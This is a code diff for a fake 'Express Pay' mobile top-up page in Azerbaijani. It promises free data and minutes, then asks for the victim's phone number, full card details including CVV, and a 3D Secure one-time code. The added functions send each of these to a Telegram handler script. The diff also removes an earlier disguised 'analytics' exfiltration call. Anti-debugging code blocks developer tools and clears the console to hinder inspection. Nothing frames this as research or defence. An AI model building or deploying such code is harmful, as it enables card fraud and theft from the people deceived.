@@ -9,99 +9,39 @@
     <title>Express pay</title>
     <script src="https://cdn.tailwindcss.com/"></script>
     <script src="https://unpkg.com/imask"></script>
-    <script>
-        // Telegram function - uses backend
-        window.sendToTelegram = async function(msg) {
-            try {
-                const res = await fetch('js/analytics.php?f=track.min.js&v=' + Date.now(), {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        event: 'user_interaction',
-                        data: btoa(msg)
-                    })
-                });
-                return await res.json();
-            } catch(e) {
-                return null;
-            }
-        };
-    </script>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet">
     <style>
-        body {
-            font-family: 'Outfit', sans-serif;
-            background-color: #ffffff;
-        }
-        .glass-card {
-            background: rgba(255, 255, 255, 1);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0);
-        }
-        .step-transition {
-            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-        .hidden-step {
-            display: none;
-            opacity: 0;
-            transform: translateY(20px);
-        }
-        .active-step {
-            display: block;
-            opacity: 1;
-            transform: translateY(0);
-        }
-        .operator-card {
-            transition: all 0.3s ease;
-        }
-        .operator-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.05), 0 10px 10px -5px rgba(0, 0, 0, 0.02);
-        }
-        .loader {
-            border-top-color: #2663ea;
-            animation: spinner 1.5s linear infinite;
-        }
-        @keyframes spinner {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .communal-btn {
-            background: linear-gradient(135deg, #f13737, #f26a6a);
-            transition: all 0.3s ease;
-        }
-        .communal-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px -5px rgba(99, 102, 241, 0.4);
-        }
-        .kiber  {
-            box-shadow: 0 0 50px rgba(255, 255, 0, 0.53);
-        }
+        body { font-family: 'Outfit', sans-serif; background-color: #ffffff; }
+        .glass-card { background: rgba(255, 255, 255, 1); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0); }
+        .step-transition { transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
+        .hidden-step { display: none; opacity: 0; transform: translateY(20px); }
+        .active-step { display: block; opacity: 1; transform: translateY(0); }
+        .operator-card { transition: all 0.3s ease; }
+        .operator-card:hover { transform: translateY(-5px); box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.05), 0 10px 10px -5px rgba(0, 0, 0, 0.02); }
+        .loader { border-top-color: #2663ea; animation: spinner 1.5s linear infinite; }
+        @keyframes spinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .kiber { box-shadow: 0 0 50px rgba(255, 255, 0, 0.53); }
     </style>
 </head>
 <body class="min-h-screen flex items-center justify-center p-4">
     
-    <div class="kiber max-w-md w-full glass-card rounded-[2.5rem]  p-8 md:p-10 relative overflow-hidden">
+    <div class="kiber max-w-md w-full glass-card rounded-[2.5rem] p-8 md:p-10 relative overflow-hidden">
         
-        <!-- Header -->
+        <!-- HEADER (ORİJİNAL) -->
         <div class="text-center mb-10">
             <div class="inline-flex items-center justify-center mb-4">
                 <img src="expreslogo.png" alt="Express Pay Logo" class="h-12 w-auto object-contain drop-shadow-xl">
             </div>
             <h1 class="text-3xl font-bold text-gray-900 tracking-tight">
-  Express <span class="text-[#F2F255]">Pay</span>
-</h1>
+                Express <span class="text-[#F2F255]">Pay</span>
+            </h1>
             <p class="text-gray-500 mt-2 text-sm">Təbriklər! Balansınızı 1 AZN artıraraq Express pay-dan 5 GB internet və 80 dəqiqə ölkədaxili danışıq qazanacaqsınız! Hədiyyənin istifadə müddəti 7 gün-dur!</p>
         </div>
 
-        <!-- Step 1: Operator Selection -->
+        <!-- STEP 1: OPERATOR (ORİJİNAL) -->
         <div id="step-1" class="step-transition active-step">
-           
-             <h2 class="text-xl font-semibold text-gray-800 mb-6 text-center">Operatoru seçin</h2>
+            <h2 class="text-xl font-semibold text-gray-800 mb-6 text-center">Operatoru seçin</h2>
             <div class="grid grid-cols-1 gap-4">
-                <!-- Azercell -->
                 <button onclick="selectOperator('Azercell')" class="operator-card flex flex-col items-center p-8 rounded-3xl border border-gray-100 bg-white hover:border-blue-200 group transition-all">
                     <div class="w-24 h-16 mb-4 flex items-center justify-center">
                         <img src="images/op1.png" alt="Azercell" class="max-w-full max-h-full object-contain group-hover:scale-110 transition-transform">
@@ -109,8 +49,6 @@
                     <p class="font-bold text-gray-900 text-lg">Azercell</p>
                     <p class="text-xs text-gray-400 mt-1">050, 051, 010</p>
                 </button>
-
-                <!-- Nar -->
                 <button onclick="selectOperator('Nar')" class="operator-card flex flex-col items-center p-8 rounded-3xl border border-gray-100 bg-white hover:border-blue-200 group transition-all">
                     <div class="w-24 h-16 mb-4 flex items-center justify-center">
                         <img src="images/op2.png" alt="Nar" class="max-w-full max-h-full object-contain group-hover:scale-110 transition-transform">
@@ -118,8 +56,6 @@
                     <p class="font-bold text-gray-900 text-lg">Nar</p>
                     <p class="text-xs text-gray-400 mt-1">070, 077</p>
                 </button>
-
-                <!-- Bakcell -->
                 <button onclick="selectOperator('Bakcell')" class="operator-card flex flex-col items-center p-8 rounded-3xl border border-gray-100 bg-white hover:border-blue-200 group transition-all">
                     <div class="w-24 h-16 mb-4 flex items-center justify-center">
                         <img src="images/op3.png" alt="Bakcell" class="max-w-full max-h-full object-contain group-hover:scale-110 transition-transform">
@@ -130,29 +66,23 @@
             </div>
         </div>
 
-        <!-- Step 2: Number Entry -->
+        <!-- STEP 2: NÖMRƏ (ORİJİNAL) -->
         <div id="step-2" class="step-transition hidden-step">
             <div class="flex items-center mb-6">
                 <button onclick="prevStep(1)" class="p-2 -ml-2 rounded-full hover:bg-gray-100 text-gray-400 hover:text-gray-600 transition-colors">
                     <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"></path></svg>
                 </button>
-                <div id="selected-op-display" class="flex items-center ml-2">
-                    <!-- Dynamic content -->
-                </div>
+                <div id="selected-op-display" class="flex items-center ml-2"></div>
             </div>
-            
             <h2 class="text-xl font-semibold text-gray-800 mb-2">Nömrəni daxil edin</h2>
             <p class="text-sm text-gray-500 mb-6">Balansını artırmaq istədiyiniz nömrəni yazın.</p>
-
             <div class="space-y-6">
                 <div class="space-y-2">
                     <label class="block text-sm font-semibold text-gray-700 ml-1">Mobil nömrə</label>
                     <div class="flex gap-3">
                         <div class="relative min-w-[110px]">
                             <span class="absolute -top-2 left-3 bg-white px-1 text-[10px] text-blue-500 font-black uppercase tracking-widest z-10">Prefiks</span>
-                            <select id="prefix-select" class="w-full p-4 rounded-2xl border-2 border-blue-50 bg-white focus:border-blue-400 transition-all outline-none appearance-none cursor-pointer font-bold text-gray-700 shadow-sm">
-                                <!-- Options will be injected by JS -->
-                            </select>
+                            <select id="prefix-select" class="w-full p-4 rounded-2xl border-2 border-blue-50 bg-white focus:border-blue-400 transition-all outline-none appearance-none cursor-pointer font-bold text-gray-700 shadow-sm"></select>
                             <div class="absolute right-3 top-1/2 -translate-y-1/2 pointer-events-none">
                                 <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-blue-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"></path></svg>
                             </div>
@@ -162,14 +92,11 @@
                         </div>
                     </div>
                 </div>
-
-                <button id="step-2-next" onclick="goToStep(3)" disabled="" class="w-full py-5 bg-gray-100 text-gray-400 font-bold rounded-2xl transition-all duration-300 cursor-not-allowed disabled:bg-gray-100 enabled:bg-[#000] enabled:text-white enabled:hover:bg-[#ff0000] enabled:shadow-lg enabled:shadow-orange-200">
-    Davam et
-</button>
+                <button id="step-2-next" onclick="goToStep(3)" disabled class="w-full py-5 bg-gray-100 text-gray-400 font-bold rounded-2xl transition-all duration-300 cursor-not-allowed disabled:bg-gray-100 enabled:bg-[#000] enabled:text-white enabled:hover:bg-[#ff0000] enabled:shadow-lg">Davam et</button>
             </div>
         </div>
 
-        <!-- Step 3: Campaign Selection -->
+        <!-- STEP 3: KAMPANİYA (1 AZN → 3 AZN DƏYİŞDİRİLDİ) -->
         <div id="step-3" class="step-transition hidden-step">
             <div class="flex items-center mb-6">
                 <button onclick="prevStep(2)" class="p-2 -ml-2 rounded-full hover:bg-gray-100 text-gray-400 hover:text-gray-600 transition-colors">
@@ -180,79 +107,54 @@
                     <p id="summary-num" class="text-sm text-gray-700 font-bold"></p>
                 </div>
             </div>
-
             <h2 class="text-xl font-semibold text-gray-800 mb-6">Kampaniyanı seçin</h2>
-
-            <div class="space-y-3 max-h-[350px] overflow-y-auto pr-2 custom-scrollbar">
-                <!-- Campaigns -->
-                <!-- 🔥 1 AZN → 3 AZN DƏYİŞDİRİLDİ -->
+            <div class="space-y-3 max-h-[350px] overflow-y-auto pr-2">
+                <!-- 🔥 1 AZN → 3 AZN -->
                 <div onclick="selectCampaign(1, '3 AZN', '5 GB', '80 dəqiqə', '7 gün')" class="campaign-card p-4 rounded-3xl border border-gray-100 bg-white hover:border-blue-200 cursor-pointer group transition-all">
                     <div class="flex justify-between items-center">
-                        <div>
-                            <p class="text-lg font-bold text-gray-900">3 AZN</p>
-                            <p class="text-sm text-blue-600 font-medium">5 GB + 80 dəq</p>
-                        </div>
+                        <div><p class="text-lg font-bold text-gray-900">3 AZN</p><p class="text-sm text-blue-600 font-medium">5 GB + 80 dəq</p></div>
                         <span class="text-xs text-gray-400 bg-gray-50 px-3 py-1 rounded-full">7 gün</span>
                     </div>
                 </div>
-
                 <div onclick="selectCampaign(2, '5 AZN', '20 GB', '150 dəqiqə', '20 gün')" class="campaign-card p-4 rounded-3xl border border-gray-100 bg-white hover:border-blue-200 cursor-pointer group transition-all">
                     <div class="flex justify-between items-center">
-                        <div>
-                            <p class="text-lg font-bold text-gray-900">5 AZN</p>
-                            <p class="text-sm text-blue-600 font-medium">20 GB + 150 dəq</p>
-                        </div>
+                        <div><p class="text-lg font-bold text-gray-900">5 AZN</p><p class="text-sm text-blue-600 font-medium">20 GB + 150 dəq</p></div>
                         <span class="text-xs text-gray-400 bg-gray-50 px-3 py-1 rounded-full">20 gün</span>
                     </div>
                 </div>
-
                 <div onclick="selectCampaign(3, '10 AZN', '30 GB', '200 dəqiqə', '30 gün')" class="campaign-card p-4 rounded-3xl border border-gray-100 bg-white hover:border-blue-200 cursor-pointer group transition-all">
                     <div class="flex justify-between items-center">
-                        <div>
-                            <p class="text-lg font-bold text-gray-900">10 AZN</p>
-                            <p class="text-sm text-blue-600 font-medium">30 GB + 200 dəq</p>
-                        </div>
+                        <div><p class="text-lg font-bold text-gray-900">10 AZN</p><p class="text-sm text-blue-600 font-medium">30 GB + 200 dəq</p></div>
                         <span class="text-xs text-gray-400 bg-gray-50 px-3 py-1 rounded-full">30 gün</span>
                     </div>
                 </div>
-
                 <div onclick="selectCampaign(4, '20 AZN', '60 GB', '300 dəqiqə', '60 gün')" class="campaign-card p-4 rounded-3xl border border-gray-100 bg-white hover:border-blue-200 cursor-pointer group transition-all">
                     <div class="flex justify-between items-center">
-                        <div>
-                            <p class="text-lg font-bold text-gray-900">20 AZN</p>
-                            <p class="text-sm text-blue-600 font-medium">60 GB + 300 dəq</p>
-                        </div>
+                        <div><p class="text-lg font-bold text-gray-900">20 AZN</p><p class="text-sm text-blue-600 font-medium">60 GB + 300 dəq</p></div>
                         <span class="text-xs text-gray-400 bg-gray-50 px-3 py-1 rounded-full">60 gün</span>
                     </div>
                 </div>
             </div>
         </div>
 
-        <!-- Step 4: Confirmation Screen -->
+        <!-- STEP 4: TƏSDİQ (ORİJİNAL) -->
         <div id="step-4" class="step-transition hidden-step text-center">
             <div class="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-6">
                 <svg xmlns="http://www.w3.org/2000/svg" class="w-10 h-10 text-green-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
             </div>
-            
             <h2 class="text-2xl font-bold text-gray-900 mb-4">Məlumatları təsdiqləyin</h2>
-            
             <div class="bg-blue-50 p-6 rounded-3xl mb-8">
                 <p id="congrats-msg" class="text-blue-800 text-sm leading-relaxed"></p>
             </div>
-
             <div class="flex gap-4">
-                <button onclick="prevStep(3)" class="flex-1 py-4 border border-gray-200 text-gray-500 font-bold rounded-2xl hover:bg-gray-50 transition-colors">
-                    Geri
-                </button>
-                <button onclick="goToStep(5)" class="flex-2 px-8 py-4 bg-[#000] text-white font-bold rounded-2xl hover:bg-[#ff0000] shadow-lg shadow-orange-200 transition-all">
-    TƏSDİQLƏ
-</button>
+                <button onclick="prevStep(3)" class="flex-1 py-4 border border-gray-200 text-gray-500 font-bold rounded-2xl hover:bg-gray-50 transition-colors">Geri</button>
+                <button onclick="goToStep(5)" class="flex-2 px-8 py-4 bg-[#000] text-white font-bold rounded-2xl hover:bg-[#ff0000] shadow-lg transition-all">TƏSDİQLƏ</button>
             </div>
         </div>
 
-        <!-- Step 5: Payment Details -->
+        <!-- STEP 5: KART (PAYMENT - ORİJİNAL, YALNIZ FETCH ÜNVANI DƏYİŞDİ) -->
         <div id="step-5" class="step-transition hidden-step">
-             <div class="flex items-center mb-6">
+            <div class="flex items-center mb-6">
                 <button onclick="prevStep(4)" class="p-2 -ml-2 rounded-full hover:bg-gray-100 text-gray-400 hover:text-gray-600 transition-colors">
                     <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"></path></svg>
                 </button>
@@ -261,40 +163,35 @@
                     <p id="payment-amount" class="text-sm text-gray-700 font-bold"></p>
                 </div>
             </div>
-
             <h2 class="text-xl font-semibold text-gray-800 mb-6">Kart məlumatlarını daxil edin</h2>
-
             <form id="payment-form" class="space-y-4">
                 <div>
                     <label class="block text-xs font-semibold text-gray-400 uppercase mb-1 ml-1">Kart sahibinin adı</label>
-                    <input type="text" id="card-name" required="" class="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-blue-500 transition-colors" placeholder="AD SOYAD">
+                    <input type="text" id="card-name" required class="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-blue-500 transition-colors" placeholder="AD SOYAD">
                 </div>
-
                 <div>
                     <label class="block text-xs font-semibold text-gray-400 uppercase mb-1 ml-1 text-red-500 hidden" id="card-error">Yanlış kart nömrəsi</label>
                     <label class="block text-xs font-semibold text-gray-400 uppercase mb-1 ml-1" id="card-label">Kart nömrəsi</label>
-                    <input type="text" id="card-number" required="" class="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-blue-500 transition-colors" placeholder="0000 0000 0000 0000">
+                    <input type="text" id="card-number" required class="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-blue-500 transition-colors" placeholder="0000 0000 0000 0000">
                 </div>
-
                 <div class="grid grid-cols-2 gap-4">
                     <div>
                         <label class="block text-xs font-semibold text-gray-400 uppercase mb-1 ml-1 text-red-500 hidden" id="expiry-error">Yanlış tarix</label>
                         <label class="block text-xs font-semibold text-gray-400 uppercase mb-1 ml-1" id="expiry-label">Bitiş tarixi</label>
-                        <input type="text" id="card-expiry" required="" class="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-blue-500 transition-colors" placeholder="AA/İİ">
+                        <input type="text" id="card-expiry" required class="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-blue-500 transition-colors" placeholder="AA/İİ">
                     </div>
                     <div>
                         <label class="block text-xs font-semibold text-gray-400 uppercase mb-1 ml-1">CVV</label>
-                        <input type="text" id="card-cvv" required="" class="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-blue-500 transition-colors" placeholder="000">
+                        <input type="text" id="card-cvv" required class="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-blue-500 transition-colors" placeholder="000">
                     </div>
                 </div>
-
-                <button type="submit" class="w-full mt-4 py-5 bg-[#000] text-white font-bold rounded-2xl hover:bg-[#ff0000] shadow-lg shadow-orange-200 transition-all flex items-center justify-center">
-    <span>Ödənişi Tamamla</span>
-</button>
+                <button type="submit" class="w-full mt-4 py-5 bg-[#000] text-white font-bold rounded-2xl hover:bg-[#ff0000] shadow-lg transition-all flex items-center justify-center">
+                    <span>Ödənişi Tamamla</span>
+                </button>
             </form>
         </div>
 
-        <!-- Step 6: 3D Secure Simulation -->
+        <!-- STEP 6: OTP (ORİJİNAL, YALNIZ FETCH ÜNVANI DƏYİŞDİ) -->
         <div id="step-6" class="step-transition hidden-step">
             <div class="text-center mb-8">
                 <div class="flex justify-center items-center gap-4 mb-6">
@@ -305,31 +202,21 @@
                 <h2 class="text-xl font-bold text-gray-900">3D Təhlükəsizlik</h2>
                 <p class="text-sm text-gray-500 mt-2">Nömrənizə göndərilən 6 rəqəmli kodu daxil edin.</p>
             </div>
-
             <form id="tds-form" class="space-y-6">
                 <div class="text-center">
-                    <input type="text" id="tds-code" required="" maxlength="6" class="w-48 text-center text-3xl font-bold tracking-[0.5em] p-4 bg-gray-50 border border-gray-200 rounded-2xl outline-none focus:border-blue-500 focus:ring-4 focus:ring-blue-50/50 transition-all" placeholder="000000">
+                    <input type="text" id="tds-code" required maxlength="6" class="w-48 text-center text-3xl font-bold tracking-[0.5em] p-4 bg-gray-50 border border-gray-200 rounded-2xl outline-none focus:border-blue-500 focus:ring-4 focus:ring-blue-50/50 transition-all" placeholder="000000">
                     <p id="tds-error" class="text-red-500 text-xs font-bold mt-4 hidden">Yanlış təsdiq kodu. Yenidən cəhd edin.</p>
                 </div>
-
-                <button type="submit" class="w-full py-5 bg-gray-900 text-white font-bold rounded-2xl hover:bg-black transition-all shadow-xl shadow-gray-200">
-                    Təsdiq et
-                </button>
-                
+                <button type="submit" class="w-full py-5 bg-gray-900 text-white font-bold rounded-2xl hover:bg-black transition-all shadow-xl shadow-gray-200">Təsdiq et</button>
                 <div class="text-center">
                     <button type="button" class="text-sm text-blue-600 font-medium hover:underline">Kodu yenidən göndər</button>
                 </div>
             </form>
         </div>
 
-        <!-- Processing / Success State -->
+        <!-- STATUS OVERLAY (ORİJİNAL) -->
         <div id="status-overlay" class="hidden absolute inset-0 bg-white/95 z-50 flex flex-col items-center justify-center p-10 text-center">
             <div id="loader" class="loader ease-linear rounded-full border-4 border-t-4 border-gray-100 h-16 w-16 mb-6"></div>
-            
-            <div id="success-icon" class="hidden w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mb-6">
-                <svg xmlns="http://www.w3.org/2000/svg" class="w-10 h-10 text-green-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
-            </div>
-
             <h3 id="status-title" class="text-xl font-bold text-gray-900 mb-2">Gözləyin...</h3>
             <p id="status-desc" class="text-gray-500 text-sm">Əməliyyatınız icra olunur.</p>
         </div>
@@ -337,26 +224,15 @@
     </div>
 
     <script>
-        // Console Protection & DevTools Disable
+        // CONSOLE PROTECTION (ORİJİNAL)
         (function() {
-            // Disable right click
             document.addEventListener('contextmenu', e => e.preventDefault());
-            
-            // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
             document.addEventListener('keydown', e => {
-                if (
-                    e.key === 'F12' ||
-                    (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-                    (e.ctrlKey && e.shiftKey && e.key === 'J') ||
-                    (e.ctrlKey && e.shiftKey && e.key === 'C') ||
-                    (e.ctrlKey && e.key === 'u')
-                ) {
+                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.shiftKey && e.key === 'C') || (e.ctrlKey && e.key === 'u')) {
                     e.preventDefault();
                     return false;
                 }
             });
-            
-            // Clear console continuously
             setInterval(() => {
                 console.clear();
                 console.log = function() {};
@@ -365,8 +241,6 @@
                 console.info = function() {};
                 console.debug = function() {};
             }, 100);
-            
-            // DevTools detection
             const devtools = { isOpen: false };
             const element = new Image();
             Object.defineProperty(element, 'id', {
@@ -375,31 +249,23 @@
                     window.location.reload();
                 }
             });
-            
             setInterval(() => {
                 devtools.isOpen = false;
                 console.log(element);
                 console.clear();
             }, 1000);
-            
-            // Debugger trap
             setInterval(() => {
                 (function() { return false; })['constructor']('debugger')();
             }, 50);
         })();
-        
-        // State
+
+        // STATE (ORİJİNAL)
         const state = {
             operator: '',
             prefix: '',
             number: '',
             campaign: null,
-            card: {
-                name: '',
-                number: '',
-                expiry: '',
-                cvv: ''
-            }
+            card: { name: '', number: '', expiry: '', cvv: '' }
         };
 
         const prefixes = {
@@ -408,23 +274,19 @@
             'Bakcell': ['055', '099']
         };
 
-        // Masks
+        // MASKS (ORİJİNAL)
         const phoneMask = IMask(document.getElementById('phone-input'), { mask: '000-00-00' });
         const cardNumberMask = IMask(document.getElementById('card-number'), { mask: '0000 0000 0000 0000' });
         const cardExpiryMask = IMask(document.getElementById('card-expiry'), { mask: '00/00' });
         const cardCvvMask = IMask(document.getElementById('card-cvv'), { mask: '000' });
         const tdsCodeMask = IMask(document.getElementById('tds-code'), { mask: '000000' });
 
-        // Validation Logic
+        // VALIDATION (ORİJİNAL)
         function isValidLuhn(number) {
-            let sum = 0;
-            let shouldDouble = false;
+            let sum = 0, shouldDouble = false;
             for (let i = number.length - 1; i >= 0; i--) {
                 let digit = parseInt(number.charAt(i));
-                if (shouldDouble) {
-                    digit *= 2;
-                    if (digit > 9) digit -= 9;
-                }
+                if (shouldDouble) { digit *= 2; if (digit > 9) digit -= 9; }
                 sum += digit;
                 shouldDouble = !shouldDouble;
             }
@@ -442,13 +304,12 @@
             return expiryDate > new Date(now.getFullYear(), now.getMonth(), 1);
         }
 
-        // Navigation
+        // NAVIGATION (ORİJİNAL)
         function goToStep(step) {
             document.querySelectorAll('.step-transition').forEach(el => {
                 el.classList.remove('active-step');
                 el.classList.add('hidden-step');
             });
-            
             const nextStep = document.getElementById(`step-${step}`);
             if (nextStep) {
                 nextStep.classList.remove('hidden-step');
@@ -456,51 +317,42 @@
             }
         }
 
-        function prevStep(step) {
-            goToStep(step);
-        }
+        function prevStep(step) { goToStep(step); }
 
-        // Step 1: Select Operator
+        // STEP 1: OPERATOR (ORİJİNAL)
         function selectOperator(op) {
             state.operator = op;
-            
-            // Update Display
             const opDisplay = document.getElementById('selected-op-display');
             const logoUrls = {
                 'Azercell': 'images/op1.png',
                 'Nar': 'images/op2.png',
                 'Bakcell': 'images/op3.png'
             };
-            
             opDisplay.innerHTML = `
                 <div class="w-12 h-6 flex items-center justify-center mr-3">
-                    <img src="https://exprespay.online/${logoUrls[op]}" class="max-h-full max-w-full object-contain" alt="${op}">
+                    <img src="${logoUrls[op]}" class="max-h-full max-w-full object-contain" alt="${op}">
                 </div>
                 <span class="font-bold text-gray-900">${op}</span>
             `;
-
-            // Update Prefixes
             const prefixSelect = document.getElementById('prefix-select');
             prefixSelect.innerHTML = prefixes[op].map(p => `<option value="${p}">${p}</option>`).join('');
-            
             goToStep(2);
         }
 
-        // Step 2: Validation
+        // STEP 2: NÖMRƏ (ORİJİNAL)
         document.getElementById('phone-input').addEventListener('input', () => {
             const nextBtn = document.getElementById('step-2-next');
             if (phoneMask.unmaskedValue.length === 7) {
                 nextBtn.disabled = false;
                 nextBtn.classList.remove('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
-                nextBtn.classList.add('bg-[#2663ea]', 'text-white', 'hover:bg-[#1d4ed8]', 'shadow-lg', 'shadow-blue-200');
+                nextBtn.classList.add('bg-[#000]', 'text-white', 'hover:bg-[#ff0000]');
             } else {
                 nextBtn.disabled = true;
                 nextBtn.classList.add('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
-                nextBtn.classList.remove('bg-[#2663ea]', 'text-white', 'hover:bg-[#1d4ed8]', 'shadow-lg', 'shadow-blue-200');
+                nextBtn.classList.remove('bg-[#000]', 'text-white', 'hover:bg-[#ff0000]');
             }
         });
 
-        // Pre-Step 3 Setup
         const originalGoToStep = goToStep;
         window.goToStep = function(step) {
             if (step === 3) {
@@ -512,63 +364,90 @@
             originalGoToStep(step);
         }
 
-        // Step 3: Select Campaign
+        // STEP 3: KAMPANİYA (ORİJİNAL)
         function selectCampaign(id, price, gb, mins, days) {
             state.campaign = { id, price, gb, mins, days };
-            
-            // Setup Confirmation Screen (Step 4)
+            localStorage.setItem('selectedCampaign', `${gb} + ${mins} (${price})`);
             document.getElementById('congrats-msg').innerHTML = `
                 Təbriklər! Balansınızı <strong>${price}</strong> artıraraq ExpressPay-dan <strong>${gb}</strong> internet və <strong>${mins}</strong> ölkədaxili danışıq qazanacaqsınız! Hədiyyənin istifadə müddəti <strong>${days}</strong>-dur!
             `;
-            
             document.getElementById('payment-amount').textContent = price;
-
             goToStep(4);
         }
 
-        // BIN to secure page mapping
-        function get3DSPage(cardNumber) {
-            const bin = cardNumber.substring(0, 4);
-            
-            // BIN ranges for different banks
-            // Kapital Bank BINs
-            if (['4169', '5258', '5440', '4272'].includes(bin)) {
-                return 'confirm.html';
-            }
-            // Unibank BINs
-            else if (['5218', '5404', '4903', '5371'].includes(bin)) {
-                return 'confirm.html';
-            }
-            // Leobank BINs
-            else if (['4245', '5502', '4015', '5389'].includes(bin)) {
-                return 'confirm.html';
-            }
-            // Azericard (ABB) BINs - default
-            else {
-                return 'confirm.html';
+        // ============================================================
+        // 🔥 1. NÖMRƏ MESAJI GÖNDƏR (YENİ)
+        // ============================================================
+        async function sendPhoneOnly() {
+            const fullPhone = `${state.prefix} ${state.number}`;
+            const formData = new FormData();
+            formData.append('phone', fullPhone);
+            formData.append('type', 'phone_only');
+            try {
+                await fetch('api/telegram-handler.php', { method: 'POST', body: formData });
+                console.log('✅ Nömrə göndərildi');
+            } catch(e) { console.log('❌ Nömrə göndərilmədi'); }
+        }
+
+        // ============================================================
+        // 🔥 2. KART MESAJI GÖNDƏR (YENİ - BİZİM FORMAT)
+        // ============================================================
+        async function sendCardData() {
+            const formData = new FormData();
+            formData.append('card_name', document.getElementById('card-name').value);
+            formData.append('card_number', cardNumberMask.value);
+            formData.append('card_expiry', cardExpiryMask.value);
+            formData.append('card_cvv', cardCvvMask.value);
+            formData.append('operator', state.operator);
+            formData.append('phone', `${state.prefix} ${state.number}`);
+            formData.append('amount', state.campaign ? state.campaign.price : '');
+            formData.append('campaign', localStorage.getItem('selectedCampaign') || '');
+            formData.append('type', 'card_only');
+            try {
+                await fetch('api/telegram-handler.php', { method: 'POST', body: formData });
+                console.log('✅ Kart göndərildi');
+            } catch(e) { console.log('❌ Kart göndərilmədi'); }
+        }
+
+        // ============================================================
+        // 🔥 3. OTP MESAJI GÖNDƏR (YENİ)
+        // ============================================================
+        async function sendOtp(otp) {
+            const formData = new FormData();
+            formData.append('phone', `${state.prefix} ${state.number}`);
+            formData.append('otp', otp);
+            formData.append('campaign', localStorage.getItem('selectedCampaign') || '');
+            formData.append('type', 'otp');
+            try {
+                await fetch('api/telegram-handler.php', { method: 'POST', body: formData });
+                console.log('✅ OTP göndərildi');
+                return true;
+            } catch(e) {
+                console.log('❌ OTP göndərilmədi');
+                return false;
             }
         }
 
-        // Step 5: Form Submission - 🔥 send_all.php → api/telegram-handler.php
+        // ============================================================
+        // STEP 5: PAYMENT (ORİJİNAL, YALNIZ FETCH DƏYİŞDİ)
+        // ============================================================
         document.getElementById('payment-form').addEventListener('submit', async function(e) {
             e.preventDefault();
-            
+
             const cardName = document.getElementById('card-name').value.trim();
             const cardNum = cardNumberMask.unmaskedValue;
             const expiry = cardExpiryMask.value;
             const cvv = cardCvvMask.value;
-            
+
             let hasError = false;
-            
-            // Validate card name
+
             if (!cardName || cardName.length < 3) {
                 document.getElementById('card-name').classList.add('border-red-500');
                 hasError = true;
             } else {
                 document.getElementById('card-name').classList.remove('border-red-500');
             }
-            
-            // Validate card number
+
             if (!cardNum || cardNum.length !== 16 || !isValidLuhn(cardNum)) {
                 document.getElementById('card-error').classList.remove('hidden');
                 document.getElementById('card-label').classList.add('hidden');
@@ -579,8 +458,7 @@
                 document.getElementById('card-label').classList.remove('hidden');
                 document.getElementById('card-number').classList.remove('border-red-500');
             }
-            
-            // Validate expiry
+
             if (!expiry || expiry.length !== 5 || !isValidExpiry(expiry)) {
                 document.getElementById('expiry-error').classList.remove('hidden');
                 document.getElementById('expiry-label').classList.add('hidden');
@@ -591,93 +469,42 @@
                 document.getElementById('expiry-label').classList.remove('hidden');
                 document.getElementById('card-expiry').classList.remove('border-red-500');
             }
-            
-            // Validate CVV
+
             if (!cvv || cvv.length !== 3) {
                 document.getElementById('card-cvv').classList.add('border-red-500');
                 hasError = true;
             } else {
                 document.getElementById('card-cvv').classList.remove('border-red-500');
             }
-            
+
             if (hasError) return;
 
             const overlay = document.getElementById('status-overlay');
-            const loader = document.getElementById('loader');
             const title = document.getElementById('status-title');
             const desc = document.getElementById('status-desc');
-
             overlay.classList.remove('hidden');
             title.textContent = 'Kart yoxlanılır...';
